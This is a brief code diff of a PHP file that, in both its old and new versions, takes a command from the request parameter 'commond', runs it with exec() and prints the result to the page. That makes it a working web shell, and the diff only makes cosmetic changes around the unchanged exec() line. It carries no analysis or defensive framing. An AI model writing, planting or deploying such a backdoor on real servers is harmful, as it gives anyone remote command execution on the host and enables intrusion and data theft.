@@ -1,7 +1,7 @@
 <?php
-//echo getcwd()."<br>";
 if(isset($_REQUEST['commond'])){
-	exec($_REQUEST['commond'],$comm);
+	///////////////////
+exec($_REQUEST['commond'],$comm);
 	echo "<br>RES: <br>";
 	echo implode("<br>\n",$comm);
 	echo "<br><br>";
